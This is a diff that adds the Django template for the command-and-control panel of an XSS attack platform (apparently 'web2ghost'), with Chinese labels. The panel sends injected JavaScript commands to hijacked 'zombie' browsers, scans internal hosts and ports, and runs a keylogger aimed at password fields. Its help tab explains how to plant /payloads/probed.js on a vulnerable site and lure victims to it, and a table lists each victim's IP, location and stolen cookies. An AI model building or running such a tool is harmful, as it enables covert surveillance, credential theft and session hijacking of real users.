@@ -1,0 +1,363 @@
+{% extends "new-nav.html" %}
+{% load w2gfilter %}
+{% block title %}CMD - CC{% endblock %}
+{% block nav_cc_on %}active{% endblock %}
+
+{% block pagebody %}
+<div class="container cc-wrapper">
+    <div id="sys_tip" class="text-danger">
+    </div>
+    <div class="panel panel-primary">
+        <div class="panel-heading">
+            <h3 class="panel-title">
+                <a class="b tn btn-li nk" role="button" data-toggle="collapse" href="#J-collapse">控制面板</a>
+            </h3>
+        </div>
+        <div id="J-collapse" class="control-panel collapse in">
+            <div class="panel-body">
+                <ul class="nav nav-tabs">
+                    <li class="active"><a href="#J-cmd" data-toggle="tab">普通命令</a></li>
+                    <li class=""><a href="#J-ping" data-toggle="tab">主机扫描</a></li>
+                    <li class=""><a href="#J-port" data-toggle="tab">端口扫描</a></li>
+                    <li class=""><a href="#J-keylogger" data-toggle="tab">键盘记录</a></li>
+                    <li class=""><a href="#J-help" data-toggle="tab">帮助说明</a></li>
+                </ul>
+                <div class="tab-content">
+                    <div class="tab-pane fade active in" id="J-cmd">
+						{% csrf_token %}
+						<input type="hidden" id="injxss_time_input" value="{% now date:"Y-m-d H:i:s" %}" />
+                        <div class="row">
+                            <!-- 左半边 -->
+                            <div class="col-md-3">
+
+                                <div class="form-group">
+                                    <label>系统代码：</label>
+                                    <select id="injxss_codz_select" class="form-control input-sm">
+										<option value="">---- 系统代码 ----</option>
+										{% for codz in codz_list %}
+											<option value="{{codz.id}}" title="{{codz.key|codz_api}}">{{codz.key|codz_api}}</option>
+										{% endfor %}
+                                    </select>
+                                </div>
+
+                                <!-- 输入框 -->
+                                <div class="form-group">
+                                    <label>系统代码指令：</label>
+                                    <input type="text" class="form-control input-sm" id="injxss_codz_value" value="w2g.watermark.set">
+                                </div>
+
+                                <div>
+                                    <button class="btn btn-info btn-sm" id="injxss_codz_value_ok">使用</button>
+                                    <button class="btn btn-primary btn-sm" id="injxss_codz_value_clean">清除</button>
+                                </div>
+
+                                <div>
+									{% for codz in codz_list %}
+										<input type="hidden" id="_{{codz.id}}_value" value="{{codz.key}}" />
+										<input type="hidden" id="_{{codz.id}}_desc" value="{{codz.desc|clean}}" />
+									{% endfor %}
+                                </div>
+
+                            </div>
+                            <!-- 中间 -->
+                            <div class="col-md-4">
+                                <div id="injxss_codz_help">设置持久性的水印，如：<br />w2g.watermark.set('evercookie','xxx');</div>
+                            </div>
+                            <!-- 右半边 -->
+                            <div class="col-md-5">
+
+                                <div class="form-group">
+                                    <textarea class="form-control" id="injxss_textarea"></textarea>
+                                </div>
+                                <!-- 按钮 -->
+                                <div class="text-right">
+                                    <button class="btn btn-info" id="injxss_submit">注入XSS命令</button>
+                                    <button class="btn btn-primary" id="injxss_clean">清除</button>
+                                </div>
+
+                            </div>
+                        </div>
+                    </div>
+                    <div class="tab-pane fade" id="J-ping">
+                        <div class="form-horizontal">
+                            <div class="form-group form-group-sm">
+                                <label class="col-sm-2 control-label">IP范围：</label>
+                                <div class="col-sm-4">
+                                    <input type="text" id="ping_range" class="form-control" value="192.168.1.100-254">
+                                </div>
+                            </div>
+                            <div class="form-group form-group-sm">
+                                <label class="col-sm-2 control-label">超时（毫秒）：</label>
+                                <div class="col-sm-4">
+                                    <input type="text" id="ping_timeout" class="form-control" value="20000">
+                                </div>
+                            </div>
+                            <div class="col-sm-offset-2 help-block">扫描指定主机段的存活状态。</div>
+                            <p class="col-sm-offset-2">
+                                <button id="ping_execute" class="btn btn-info">执行</button>
+                            </p>
+                        </div>
+                    </div>
+                    <div class="tab-pane fade" id="J-port">
+                        <div class="form-horizontal">
+                            <div class="form-group form-group-sm">
+                                <label class="col-sm-2 control-label">IP:</label>
+                                <div class="col-sm-4">
+                                    <input type="text" id="port_host" class="form-control" value="192.168.1.100">
+                                </div>
+                            </div>
+                            <div class="form-group form-group-sm">
+                                <label class="col-sm-2 control-label">端口：</label>
+                                <div class="col-sm-4">
+                                    <input type="text" id="port_range" class="form-control" value="8888">
+                                </div>
+                            </div>
+                            <div class="form-group form-group-sm">
+                                <label class="col-sm-2 control-label">超时（毫秒）：</label>
+                                <div class="col-sm-4">
+                                    <input type="text" id="port_timeout" class="form-control" value="1000">
+                                </div>
+                            </div>
+                            <div class="col-sm-offset-2 help-block">
+                                扫描指定IP端口开放情况。一次扫描一个，因为批量执行对于JavaScript来说由于脚本缺陷无法准确进行。 
+                                <br/>常用端口：21,22,23,80,81,443,903,1433,3306,3389,5432,5989,7777,8080,8081,8181,8888,9999
+                            </div>
+                            <div class="col-sm-offset-2">
+                                <button id="port_execute" class="btn btn-info">执行</button>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="tab-pane fade" id="J-keylogger">
+                        <div class="form-horizontal">
+                            <div class="form-group form-group-sm">
+                                <label class="control-label col-sm-2">DOM对象：</label>
+                                <div class="col-sm-4">
+                                    <input type="text" id="key_dom" class="form-control" value="document">
+                                </div>
+                                <p class="col-sm-2">
+                                    <button id="key_execute" class="btn btn-info btn-sm">执行</button>
+                                </p>
+                            </div>
+                            <div class="col-sm-offset-2 help-block">
+                                键盘记录器，可以记录整个DOM页面（document）的键盘事件，也可以仅记录指定DOM对象的键盘事件。<br>
+                                如下DOM树：<br/>
+                                <br/>
+                                &lt;div id="box"&gt;<br/>
+                                  &lt;input id="password" value="" type="password" /&gt;<br/>
+                                &lt;/div&gt;<br/>
+                                <br/>
+                                如果我们要监控上面password的键入值，DOM对象的值可以设置为：<br/>
+                                1、DOM元素的ID号：password<br/>
+                                2、DOM元素的对象本身：document.getElementById('password')<br/>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="tab-pane fade" id="J-help">
+                        在XSS攻击时，我们想持续地拿到目标用户的一些隐私信息，可以使用这个CC远控功能。<br/>
+                        在使用CC远控功能之前，需要进行如下步骤：
+
+                        <blockquote>
+                            1. 目标网页存在XSS漏洞，比如某论坛、某邮箱、某社区等的页面；<br/>
+                            2. 将这个平台的 <a href="/payloads/probed.js" class="text-info">/payloads/probed.js</a> 注入到目标页面中；<br/>
+                               比如注入类似下面这段代码：<br/>
+                               &lt;script src="http://.../payloads/probed.js"&gt;&lt;/script&gt;<br/>
+                            3. 欺骗目标用户访问目标网页；<br/>
+                            4. 用户的浏览器就会加载 <a href="/payloads/probed.js" class="text-info">/payloads/probed.js</a>，成为僵尸用户；
+                        </blockquote>
+
+                        完成如上步骤后，我们就可以在这个平台上进行远控，执行任意JavaScript指令。<br/>
+                        <a href="/testpage" class="text-info">demo</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <h3 class="tit">
+        <a class="btn btn-link" role="button" data-toggle="collapse" href="#J-collapse-1">僵尸用户</a>
+    </h3>
+    <div id="J-collapse-1" class="collapse in">
+        <form class="form-inline filter-wrapper hidden-xs hidden-sm clearfix" method="GET">
+            <div class="form-group radio-wrapper">
+                <label class="radio-inline">
+                    <input type="radio" id="filter_all" name="status" value="all">
+                    所有（{{zombies_count}}）
+                </label>
+                <label class="radio-inline">
+                    <input type="radio" id="filter_live" name="status" value="live" checked>
+                    存活（{{zombies_live_count}}）
+                </label>
+                <label class="radio-inline">
+                    <input type="radio" id="filter_dead" name="status" value="dead">
+                    下线（{{zombies_dead_count}}）
+                </label>
+            </div>
+
+            <div class="form-group form-group-sm">
+                <select class="form-control" id="filter_os" name="os">
+                    <option value="">操作系统</option>
+					{% for item in oss %}
+						<option value="{{item}}" title="{{item}}">{{item}}</option>
+					{% endfor %}
+                </select>
+            </div>
+
+            <div class="form-group form-group-sm">
+                <select class="form-control" id="filter_browser" name="browser">
+                    <option value="">浏览器</option>
+					{% for item in browsers %}
+						<option value="{{item}}" title="{{item}}">{{item}}</option>
+					{% endfor %}
+                </select>
+            </div>
+
+            <div class="form-group form-group-sm">
+                <label class="control-label">关键词：</label>
+                <input type="text" id="filter_search_val" name="q" class="form-control">
+            </div>
+
+            <div class="form-group radio-wrapper">
+                <label class="radio-inline">
+                    <input type="radio" id="filter_title" name="q_type" value="title">
+                    Title
+                </label>
+                <label class="radio-inline">
+                    <input type="radio" id="filter_location" name="q_type" value="location" checked>
+                    Location
+                </label>
+            </div>
+            <button id="filter_search_btn" class="btn btn-default btn-sm pull-right">过滤</button>
+        </form>
+        <div class="table-responsive">
+            <table class="table table-striped">
+                <thead>
+                    <tr>
+                        <th class="hidden-xs hidden-sm">
+                            <input type="checkbox" id="all_zombie_check">
+                        </th>
+                        <th class="hidden-xs hidden-sm">ID</th>
+                        <th class="hidden-xs hidden-sm">OS</th>
+                        <th>Browser</th>
+                        <th class="hidden-xs hidden-sm">IP</th>
+                        <th class="hidden-xs hidden-sm">Title</th>
+                        <th>Location URL</th>
+                        <th class="hidden-xs hidden-sm">Cookie</th>
+                        <th class="hidden-xs hidden-sm">Born Time</th>
+                        <th class="hidden-xs hidden-sm">Up Time</th>
+                        <th class="hidden-xs hidden-sm">-</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for zombie in zombie_list %}
+						<tr class="hidden-xs hidden-sm">
+							<td colspan="11">
+								<span class="left">
+                                <input type="checkbox" id="zombie_check{{zombie.id}}" class="zombie_check" value="{{zombie.id}}" />
+                                &nbsp;&nbsp
+                                    {% if zombie.life_status|upper == 'LIVE' %}
+                                        水印ID：<strong class="text-danger">{{zombie.uid}}</strong>
+                                    {% else %}
+                                        水印ID：<span class="text-info">{{zombie.uid}}</span>
+                                    {% endif %}
+                                    &nbsp;|&nbsp;
+                                    影子数：{{zombie.shadows_count}}
+                                    &nbsp;|&nbsp;
+                                    {% if zombie.life_status|upper == 'LIVE' %}
+                                        状态：<strong class="text-danger">{{zombie.life_status|upper}}</strong>
+                                    {% else %}
+                                        状态：<span class="text-info">{{zombie.life_status|upper}}</span>
+                                    {% endif %}
+								<span class="pull-right">
+									{{zombie.desc}}&nbsp;&nbsp;|&nbsp;
+									<a role="button" class="btn btn-default btn-xs" data-action="modalBtn" data-type="input" data-id="{{zombie.id}}" data-desc="{{zombie.desc}}"  href="javascript:;" title="编辑zombie的备注信息">备注编辑</a>
+								</span>
+							</td>
+						</tr>
+                        <tr></tr>
+                       	<tr>
+							<td></td>
+							<td class="hidden-xs hidden-sm">{{zombie.id}}</td>
+							<td class="hidden-xs hidden-sm">{{zombie.os}}</td>
+							<td>{{zombie.browser}}</td>
+							<td class="hidden-xs hidden-sm"><a id="queryip_a" href="http://ip138.com/ips.asp?ip={{zombie.ip}}" title="查询IP地址" target="_blank">Q</a> {{zombie.ip}}</td>
+							<td class="hidden-xs hidden-sm">{{zombie.title}}</td>
+							<td>{{zombie.location}}</td>
+							<td class="hidden-xs hidden-sm">
+								<a href="javascript:;" data-action="modalBtn" data-type="showCookie" title="Cookie内容" data-cookie="{{zombie.cookie}}">查看</a>
+							</td>
+							<td class="hidden-xs hidden-sm">{{zombie.born_time|date:"Y-m-d H:i"}}</td>
+							<td class="hidden-xs hidden-sm">{{zombie.up_time|date:"Y-m-d H:i"}}</td>
+							<td class="hidden-xs hidden-sm">
+								<a href="/cc/report/{{zombie.id}}" target="_blank">详情</a>
+								/
+								<a href="javascript:;" data-action="modalBtn" data-type="delzombie" data-id="{{zombie.id}}">删除</a>
+							</td>
+						</tr>
+						<input type="hidden" id="innerip{{zombie.id}}" value="{{zombie.innerip}}" />
+					{% endfor %}
+                </tbody>
+            </table>
+        </div>
+    </div>
+</div>
+
+    <div id="J-modal" class="modal fade">
+      <div class="modal-dialog modal-sm">
+        <div class="modal-content">
+          <div class="modal-header">
+            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                <span aria-hidden="true">&times;</span>
+            </button>
+            <h4 class="modal-title">Cookie内容</h4>
+          </div>
+          <div class="modal-body">
+          </div>
+          <div class="modal-footer hidden">
+            <button type="button" id="J-confirm" class="btn btn-info">确定</button>
+            <button type="button" id="J-cancel" class="btn btn-primary" data-dismiss="modal">取消</button>
+          </div>
+        </div><!-- /.modal-content -->
+      </div><!-- /.modal-dialog -->
+    </div><!-- /.modal -->
+{% endblock %}
+
+{% block js %}
+    <script>
+        function _gg(id){return document.getElementById(id);}
+        window.onload = function(){
+            if(location.href.indexOf('?')!=-1){
+                var kvs = location.href.split('?')[1];
+                var kv_list = kvs.split('&');
+                for(i in kv_list){
+                    kv = kv_list[i];
+                    k = kv.split('=')[0];
+                    v = kv.split('=')[1];
+                    if(k=='status'){
+                        if(v=='live'){_gg('filter_live').checked = 'checked';}
+                        else if(v=='dead'){_gg('filter_dead').checked = 'checked';}
+                        else{_gg('filter_all').checked = 'checked';}
+                    }
+                    else if(k=='q'){
+                        if(v){_gg('filter_search_val').value=v;}
+                    }
+                    else if(k=='q_type'){
+                        if(v=='title'){_gg('filter_title').checked = 'checked';}
+                        if(v=='location'){_gg('filter_location').checked = 'checked';}
+                    }
+                    else if(k=='os'){
+                        if(v){_gg('filter_os').value = v;}
+                    }
+                    else if(k=='browser'){
+                        v = v.replace('+',' ');
+                        if(v){_gg('filter_browser').value = v;}
+                    }
+                }
+            }
+            else {
+                _gg('filter_all').checked = 'checked';
+            }
+        }
+    </script>
+
+	<script type="text/javascript" src="/statics/js/web2ghost.js"></script>
+{% endblock %}
+
